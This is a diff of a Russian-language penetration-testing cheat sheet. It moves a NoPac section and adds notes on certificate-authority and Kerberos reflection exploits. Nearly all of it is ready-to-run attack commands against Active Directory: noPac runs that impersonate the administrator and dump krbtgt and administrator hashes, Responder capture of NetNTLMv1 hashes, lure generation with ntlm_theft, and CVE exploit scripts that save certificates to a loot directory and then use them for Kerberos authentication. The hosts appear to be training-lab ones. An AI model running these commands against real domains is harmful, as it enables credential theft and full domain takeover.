@@ -1787,17 +1787,6 @@ rsync 10.129.228.37::public/flag.txt flag.txt
 	
 # Перебор пользователей через ssh
 	scanner/ssh/ssh_enumusers
-# NoPac
-	git clone https://github.com/Ridter/noPac.git
-	netexec ldap 10.10.10.10 -u username -p 'Password123' -d 'domain.local' --kdcHost 10.10.10.10 -M MAQ -проверяем машина квота
-	netexec smb 10.10.10.10 -u '' -p '' -d domain -M nopac  - проверяем нопак
-	
-	python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap  ---- - проверяем нопак
-	
-	python noPac.py 'domain.local/user' -hashes ':31d6cfe0d16ae931b73c59d7e0c089c0' -dc-ip 10.10.10.10 -use-ldap -dump   --- дампим все
-	python noPac.py cgdomain.com/sanfeng:'1qaz@WSX' -dc-ip 10.211.55.203 -dc-host lab2012 --impersonate administrator -dump -just-dc-user cgdomain/krbtgt		--- дампим krbtgt
-
-	python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator   --- дампим админ
 
 # Pre2k
 
@@ -1903,12 +1892,24 @@ rsync 10.129.228.37::public/flag.txt flag.txt
 	python3 ntlm_theft.py -g htm -s <my_ip> -f student
 	sudo responder -I tun0 
 
-Поймать хешь netntlmv1
+# Поймать хешь netntlmv1
 
 		sudo responder -I eth0 --lm --disable-ess -v
 		https://ntlmv1.com/login.php (сайт который переводит netntlmv1 в NTLM hash)
+		
+# NoPac
+	git clone https://github.com/Ridter/noPac.git
+	netexec ldap 10.10.10.10 -u username -p 'Password123' -d 'domain.local' --kdcHost 10.10.10.10 -M MAQ -проверяем машина квота
+	netexec smb 10.10.10.10 -u '' -p '' -d domain -M nopac  - проверяем нопак
+	
+	python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap  ---- - проверяем нопак
+	
+	python noPac.py 'domain.local/user' -hashes ':31d6cfe0d16ae931b73c59d7e0c089c0' -dc-ip 10.10.10.10 -use-ldap -dump   --- дампим все
+	python noPac.py cgdomain.com/sanfeng:'1qaz@WSX' -dc-ip 10.211.55.203 -dc-host lab2012 --impersonate administrator -dump -just-dc-user cgdomain/krbtgt		--- дампим krbtgt
 
-# CVE 2026-54121 (уязвимость цетра сертификации)
+	python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator   --- дампим админ
+
+# CertiGhost CVE 2026-54121 (уязвимость цетра сертификации)
 
 		https://github.com/aniqfakhrul/CVE-2026-54121
 		https://github.com/marcgoam/CVE-2026-54121-CertiGhost
@@ -1916,12 +1917,14 @@ rsync 10.129.228.37::public/flag.txt flag.txt
 		sudo python3 certighost.py -d lab.local -u max -p 'P@ssword123!' --dc-ip 192.168.0.200
 
 # Kerberos Reflection (CVE-2026-26128) — LPE → SYSTEM напрямую
-
+	если DC и CA на одном хосте
 	https://github.com/jarnovandenbrink/CVE-2026-26128
 	
 	b. Запуск эксплойта от max:
 	python3 CVE-2026-26128.py 'lab02.local/max:P@ssword123!' -t 'http://dc02.lab02.local/certsrv/certfnsh.asp' -l 192.168.56.1 -dc-ip 192.168.56.103 -s 60 --lootdir ./loot
-
+	если dc и ca на разных хостах то только
+	python3 CVE-2026-26128_split_CA01.py 'lab.local/max:P@ssword123!' -t 'http://ca01.lab.local/certsrv/certfnsh.asp' --relay-target-ip 192.168.56.107 --coerce-target 'ca01.lab.local' --coerce-target-ip 192.168.56.107 -l 192.168.56.1 -dc-ip 192.168.56.106 --template Machine  -s 5 --lootdir ./loot -debug
+	
 	c. TGT для DC02$ из сертификата (PKINIT):
 	certipy-ad auth -pfx loot/DC02.pfx -username 'DC02$' -domain lab02.local -dc-ip 192.168.56.103
 
